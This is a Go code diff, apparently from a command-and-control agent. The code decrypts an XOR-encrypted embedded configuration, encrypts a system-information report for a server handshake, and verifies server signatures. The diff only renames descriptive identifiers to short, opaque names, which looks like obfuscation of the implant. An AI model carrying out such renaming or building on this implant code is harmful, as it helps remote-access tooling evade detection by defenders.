@@ -21,9 +21,14 @@ import (
 	"fmt"
 )
 
-// xorDecrypt decrypts a base64-encoded XOR-encrypted string using the given key
+// cfgDec decrypts a base64-encoded XOR-encrypted string using the given key
 // This matches the pattern used by HTTPS agents for runtime decryption
-func xorDecrypt(encoded, key string) (string, error) {
+func secVal(enc string) string {
+	v, _ := cfgDec(enc, cfgKey)
+	return v
+}
+
+func cfgDec(encoded, key string) (string, error) {
 	if encoded == "" || key == "" {
 		return "", fmt.Errorf(Err(E1))
 	}
@@ -43,13 +48,13 @@ func xorDecrypt(encoded, key string) (string, error) {
 }
 
 // decryptConfig decrypts the embedded configuration
-// First decrypts the secret using xorKey, then uses the decrypted secret to decrypt the config
+// First decrypts the secret using cfgKey, then uses the decrypted secret to decrypt the config
 func decryptConfig(encrypted string) (map[string]string, error) {
-	// First, decrypt the secret using xorKey (same pattern as HTTPS agent)
+	// First, decrypt the secret using cfgKey (same pattern as HTTPS agent)
 	decryptedSecret := secret
-	if xorKey != "" && secret != "" {
+	if cfgKey != "" && secret != "" {
 		var err error
-		decryptedSecret, err = xorDecrypt(secret, xorKey)
+		decryptedSecret, err = cfgDec(secret, cfgKey)
 		if err != nil {
 			return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
@@ -88,7 +93,7 @@ func decryptConfig(encrypted string) (map[string]string, error) {
 }
 
 // encryptHandshakePayload encrypts the system info for the handshake
-func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret string) (string, error) {
+func encryptHandshakePayload(sysInfo *NR, publicKeyPEM, initSecret string) (string, error) {
 	// Marshal system info to JSON
 	sysInfoJSON, err := json.Marshal(sysInfo)
 	if err != nil {
@@ -138,11 +143,11 @@ func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret
 
 	// Create envelope
 	envelope := struct {
-		EncryptedKey  string `json:"ek"`
-		EncryptedData string `json:"ed"`
+		EK string `json:"ek"`
+		ED string `json:"ed"`
 	}{
-		EncryptedKey:  base64.StdEncoding.EncodeToString(encryptedKey),
-		EncryptedData: base64.StdEncoding.EncodeToString(encryptedData),
+		EK: base64.StdEncoding.EncodeToString(encryptedKey),
+		ED: base64.StdEncoding.EncodeToString(encryptedData),
 	}
 
 	envelopeJSON, err := json.Marshal(envelope)
@@ -154,7 +159,7 @@ func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret
 }
 
 // verifyServerSignature verifies the server's RSA signature
-func verifyServerSignature(resp *SignedResponse, publicKeyPEM string) error {
+func verifyServerSignature(resp *VResp, publicKeyPEM string) error {
 	// Parse public key
 	block, _ := pem.Decode([]byte(publicKeyPEM))
 	if block == nil {
@@ -167,7 +172,7 @@ func verifyServerSignature(resp *SignedResponse, publicKeyPEM string) error {
 	}
 
 	// Recreate verification data
-	verificationData := fmt.Sprintf("%s:%s", resp.NewClientID, resp.Seed)
+	verificationData := fmt.Sprintf("%s:%s", resp.NNID, resp.Seed)
 	hashed := sha256.Sum256([]byte(verificationData))
 
 	// Decode signature
